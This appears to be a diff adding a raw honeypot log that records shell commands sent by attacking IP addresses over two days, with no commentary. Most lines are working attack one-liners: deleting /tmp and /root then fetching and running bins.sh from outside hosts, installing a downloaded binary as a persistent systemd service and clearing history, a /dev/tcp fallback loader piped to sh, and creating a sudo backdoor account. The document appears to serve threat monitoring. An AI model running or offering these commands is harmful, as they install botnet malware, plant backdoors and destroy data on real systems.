@@ -1,0 +1,249 @@
+2024-11-19 18:10:00.573334 - ('80.238.125.174', 55988) - vssadmin
+2024-11-20 03:55:18.169186 - ('37.44.238.68', 35836) - whoami
+2024-11-20 03:55:20.035013 - ('37.44.238.68', 35786) - whoami
+2024-11-20 03:55:21.753252 - ('37.44.238.68', 35820) - whoami
+2024-11-20 03:55:24.685690 - ('37.44.238.68', 35798) - whoami
+2024-11-20 03:55:26.829229 - ('37.44.238.68', 35806) - whoami
+2024-11-20 03:55:28.502941 - ('37.44.238.68', 35846) - whoami
+2024-11-20 03:55:31.330812 - ('37.44.238.68', 35850) - whoami
+2024-11-20 03:55:33.000298 - ('37.44.238.68', 35860) - whoami
+2024-11-20 03:55:34.640836 - ('37.44.238.68', 36458) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-20 03:55:37.359074 - ('37.44.238.68', 36466) - whoami
+2024-11-20 03:55:38.429490 - ('37.44.238.68', 36474) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://87.120.125.191/bins.sh; curl -O http://87.120.125.191/bins.sh;/bin/busybox wget http://87.120.125.191/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-20 03:55:41.174326 - ('37.44.238.68', 36488) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://87.120.125.191/bins.sh; curl -O http://87.120.125.191/bins.sh;/bin/busybox wget http://87.120.125.191/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-20 03:55:43.355250 - ('37.44.238.68', 36502) - whoami
+2024-11-20 03:55:45.010133 - ('37.44.238.68', 36508) - whoami
+2024-11-20 03:55:46.603945 - ('37.44.238.68', 36522) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-20 03:55:48.431826 - ('37.44.238.68', 48740) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-20 03:55:50.012947 - ('37.44.238.68', 48752) - whoami
+2024-11-20 03:55:51.846597 - ('37.44.238.68', 48758) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-20 03:55:53.407464 - ('37.44.238.68', 48774) - whoami
+2024-11-20 03:55:56.132402 - ('37.44.238.68', 48782) - whoami
+2024-11-20 03:55:57.972380 - ('37.44.238.68', 48794) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-20 03:56:00.355058 - ('37.44.238.68', 48810) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-20 03:56:02.689954 - ('37.44.238.68', 48824) - whoami
+2024-11-20 03:56:03.680693 - ('37.44.238.68', 48832) - whoami
+2024-11-20 03:56:05.867704 - ('37.44.238.68', 57252) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-20 03:56:08.037304 - ('37.44.238.68', 57262) - whoami
+2024-11-20 03:56:10.099166 - ('37.44.238.68', 57270) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-20 03:56:12.160833 - ('37.44.238.68', 57280) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-20 03:56:14.293463 - ('37.44.238.68', 57290) - whoami
+2024-11-20 03:56:16.291905 - ('37.44.238.68', 58844) - whoami
+2024-11-20 03:56:18.038073 - ('37.44.238.68', 58846) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-20 03:56:20.287396 - ('37.44.238.68', 58860) - whoami
+2024-11-20 03:56:22.554517 - ('37.44.238.68', 58872) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-20 03:56:24.779947 - ('37.44.238.68', 58878) - whoami
+2024-11-20 03:56:26.163504 - ('37.44.238.68', 46820) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://87.120.125.191/bins.sh; curl -O http://87.120.125.191/bins.sh;/bin/busybox wget http://87.120.125.191/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-20 03:56:28.085948 - ('37.44.238.68', 46834) - whoami
+2024-11-20 03:56:30.172910 - ('37.44.238.68', 46848) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-20 03:56:32.135930 - ('37.44.238.68', 46862) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-20 03:56:33.647520 - ('37.44.238.68', 46876) - whoami
+2024-11-20 03:56:37.004357 - ('37.44.238.68', 46892) - whoami
+2024-11-20 03:56:37.860380 - ('37.44.238.68', 49566) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://87.120.125.191/bins.sh; curl -O http://87.120.125.191/bins.sh;/bin/busybox wget http://87.120.125.191/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-20 03:56:40.221815 - ('37.44.238.68', 49580) - whoami
+2024-11-20 03:56:42.204327 - ('37.44.238.68', 49588) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-20 03:56:44.298290 - ('37.44.238.68', 50396) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://87.120.125.191/bins.sh; curl -O http://87.120.125.191/bins.sh;/bin/busybox wget http://87.120.125.191/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-20 03:56:46.223646 - ('37.44.238.68', 50408) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-20 03:56:47.821572 - ('37.44.238.68', 50412) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-20 03:56:50.589154 - ('37.44.238.68', 48902) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-20 03:56:53.051358 - ('37.44.238.68', 48916) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://87.120.125.191/bins.sh; curl -O http://87.120.125.191/bins.sh;/bin/busybox wget http://87.120.125.191/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-20 03:56:55.050749 - ('37.44.238.68', 48930) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://87.120.125.191/bins.sh; curl -O http://87.120.125.191/bins.sh;/bin/busybox wget http://87.120.125.191/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-20 03:56:56.535317 - ('37.44.238.68', 46138) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://87.120.125.191/bins.sh; curl -O http://87.120.125.191/bins.sh;/bin/busybox wget http://87.120.125.191/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-20 06:18:52.208371 - ('46.19.143.66', 46318) - apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 pvcZMQtP) system && sudo usermod -aG sudo system
+2024-11-20 06:18:52.916253 - ('46.19.143.66', 46318) - lscpu && echo -e "pvcZMQtP\npvcZMQtP" | passwd && curl https://ipinfo.io/org --insecure -s && free -h && apt
+2024-11-20 07:18:37.989806 - ('195.178.110.6', 50084) - apt
+2024-11-20 07:18:38.517920 - ('195.178.110.6', 50084) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-11-20 07:18:39.858574 - ('195.178.110.6', 50092) - apt
+2024-11-20 07:18:40.456961 - ('195.178.110.6', 50092) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-11-20 07:18:41.785915 - ('195.178.110.6', 54470) - apt
+2024-11-20 07:18:42.314424 - ('195.178.110.6', 54470) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-11-20 07:18:43.744143 - ('195.178.110.6', 54486) - apt
+2024-11-20 07:18:44.262046 - ('195.178.110.6', 54486) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-11-20 07:18:45.705888 - ('195.178.110.6', 54492) - apt
+2024-11-20 07:18:46.202178 - ('195.178.110.6', 54492) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-11-20 07:31:06.185744 - ('87.120.113.231', 34320) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi
+
+2024-11-20 10:07:07.051401 - ('195.178.110.34', 41962) - apt
+2024-11-20 10:07:07.578399 - ('195.178.110.34', 41962) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-11-20 10:07:08.999843 - ('195.178.110.34', 59286) - apt
+2024-11-20 10:07:09.560289 - ('195.178.110.34', 59286) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-11-20 10:07:10.958157 - ('195.178.110.34', 47110) - apt
+2024-11-20 10:07:11.522812 - ('195.178.110.34', 47110) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-11-20 10:07:12.864983 - ('195.178.110.34', 33136) - apt
+2024-11-20 10:07:13.402946 - ('195.178.110.34', 33136) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-11-20 10:07:14.897571 - ('195.178.110.34', 48606) - apt
+2024-11-20 10:07:15.540433 - ('195.178.110.34', 48606) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-11-20 10:07:17.150217 - ('195.178.110.34', 34756) - apt
+2024-11-20 10:07:17.593078 - ('195.178.110.34', 34756) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-11-20 10:07:18.931417 - ('195.178.110.34', 52032) - apt
+2024-11-20 10:07:19.509797 - ('195.178.110.34', 52032) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-11-20 10:07:20.980840 - ('195.178.110.34', 39972) - apt
+2024-11-20 10:07:21.447762 - ('195.178.110.34', 39972) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-11-20 10:07:22.837400 - ('195.178.110.34', 56228) - apt
+2024-11-20 10:07:23.333662 - ('195.178.110.34', 56228) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-11-20 10:07:24.825001 - ('195.178.110.34', 41616) - apt
+2024-11-20 10:07:25.372725 - ('195.178.110.34', 41616) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-11-20 10:07:26.825004 - ('195.178.110.34', 58764) - apt
+2024-11-20 10:07:27.318458 - ('195.178.110.34', 58764) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-11-20 10:07:29.016586 - ('195.178.110.34', 44022) - apt
+2024-11-20 10:07:29.498389 - ('195.178.110.34', 44022) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-11-20 11:51:44.155697 - ('87.120.113.231', 54512) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi
+
+2024-11-20 11:59:26.269639 - ('182.215.66.232', 37232) - /ip cloud print
+2024-11-20 11:59:27.488465 - ('182.215.66.232', 37232) - ifconfig
+2024-11-20 11:59:28.484049 - ('182.215.66.232', 37232) - uname -a
+2024-11-20 11:59:29.478872 - ('182.215.66.232', 37232) - cat /proc/cpuinfo
+2024-11-20 11:59:30.497202 - ('182.215.66.232', 37232) - ps | grep '[Mm]iner'
+2024-11-20 11:59:31.496564 - ('182.215.66.232', 37232) - ps -ef | grep '[Mm]iner'
+2024-11-20 11:59:32.486452 - ('182.215.66.232', 37232) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
+2024-11-20 11:59:33.478610 - ('182.215.66.232', 37232) - echo Hi | cat -n
+2024-11-20 15:13:06.960992 - ('182.215.66.232', 47130) - /ip cloud print
+2024-11-20 15:13:08.169303 - ('182.215.66.232', 47130) - ifconfig
+2024-11-20 15:13:09.149448 - ('182.215.66.232', 47130) - uname -a
+2024-11-20 15:13:10.134471 - ('182.215.66.232', 47130) - cat /proc/cpuinfo
+2024-11-20 15:13:11.114572 - ('182.215.66.232', 47130) - ps | grep '[Mm]iner'
+2024-11-20 15:13:12.096259 - ('182.215.66.232', 47130) - ps -ef | grep '[Mm]iner'
+2024-11-20 15:13:13.079626 - ('182.215.66.232', 47130) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
+2024-11-20 15:13:14.075119 - ('182.215.66.232', 47130) - echo Hi | cat -n
+2024-11-20 15:38:37.120173 - ('182.215.66.232', 58662) - /ip cloud print
+2024-11-20 15:38:38.329385 - ('182.215.66.232', 58662) - ifconfig
+2024-11-20 15:38:39.312821 - ('182.215.66.232', 58662) - uname -a
+2024-11-20 15:38:40.297435 - ('182.215.66.232', 58662) - cat /proc/cpuinfo
+2024-11-20 15:38:41.293449 - ('182.215.66.232', 58662) - ps | grep '[Mm]iner'
+2024-11-20 15:38:42.285629 - ('182.215.66.232', 58662) - ps -ef | grep '[Mm]iner'
+2024-11-20 15:38:43.273186 - ('182.215.66.232', 58662) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
+2024-11-20 15:38:44.263360 - ('182.215.66.232', 58662) - echo Hi | cat -n
+2024-11-20 16:10:01.278521 - ('87.120.113.231', 51978) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi
+
+2024-11-20 16:49:17.315837 - ('46.19.143.66', 55216) - apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 zwNhdgFr) system && sudo usermod -aG sudo system
+2024-11-20 16:49:18.267482 - ('46.19.143.66', 55216) - lscpu && echo -e "zwNhdgFr\nzwNhdgFr" | passwd && curl https://ipinfo.io/org --insecure -s && free -h && apt
+2024-11-20 18:31:48.147275 - ('87.120.113.231', 53792) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi
+
+2024-11-20 20:09:16.027184 - ('87.120.113.231', 58634) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi
+
+2024-11-20 20:13:11.030569 - ('87.120.113.231', 43872) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi
+
+2024-11-20 20:24:13.867538 - ('46.19.143.66', 54982) - apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 Th9mUYCK) system && sudo usermod -aG sudo system
+2024-11-20 20:24:15.864323 - ('46.19.143.66', 54982) - lscpu && echo -e "Th9mUYCK\nTh9mUYCK" | passwd && curl https://ipinfo.io/org --insecure -s && free -h && apt
+2024-11-20 21:47:37.117662 - ('93.121.237.195', 45205) - /ip cloud print
+2024-11-20 21:47:37.894706 - ('93.121.237.195', 45205) - ifconfig
+2024-11-20 21:47:38.450835 - ('93.121.237.195', 45205) - uname -a
+2024-11-20 21:47:39.033034 - ('93.121.237.195', 45205) - cat /proc/cpuinfo
+2024-11-20 21:47:39.615086 - ('93.121.237.195', 45205) - ps | grep '[Mm]iner'
+2024-11-20 21:47:40.150397 - ('93.121.237.195', 45205) - ps -ef | grep '[Mm]iner'
+2024-11-20 21:47:40.646789 - ('93.121.237.195', 45205) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
+2024-11-20 21:47:41.208325 - ('93.121.237.195', 45205) - echo Hi | cat -n
+2024-11-21 01:02:43.431365 - ('37.44.238.68', 50754) - whoami
+2024-11-21 01:02:47.138791 - ('37.44.238.68', 50760) - whoami
+2024-11-21 01:02:49.362368 - ('37.44.238.68', 50772) - whoami
+2024-11-21 01:02:51.428577 - ('37.44.238.68', 50740) - whoami
+2024-11-21 01:02:53.042711 - ('37.44.238.68', 50762) - whoami
+2024-11-21 01:02:56.490133 - ('37.44.238.68', 50774) - whoami
+2024-11-21 01:02:59.190159 - ('37.44.238.68', 50730) - whoami
+2024-11-21 01:03:02.445467 - ('37.44.238.68', 50732) - whoami
+2024-11-21 01:03:04.276262 - ('37.44.238.68', 50784) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-21 01:03:06.696585 - ('37.44.238.68', 55330) - whoami
+2024-11-21 01:03:08.825427 - ('37.44.238.68', 55344) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-21 01:03:11.021277 - ('37.44.238.68', 55360) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://87.120.125.191/bins.sh; curl -O http://87.120.125.191/bins.sh;/bin/busybox wget http://87.120.125.191/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-21 01:03:14.405837 - ('37.44.238.68', 55366) - whoami
+2024-11-21 01:03:16.380838 - ('37.44.238.68', 55370) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-21 01:03:19.185601 - ('37.44.238.68', 55372) - whoami
+2024-11-21 01:03:21.222577 - ('37.44.238.68', 55380) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
+2024-11-21 01:03:23.308724 - ('37.44.238.68', 55386) - whoami
+2024-11-21 01:03:25.522845 - ('37.44.238.68', 55396) - whoami
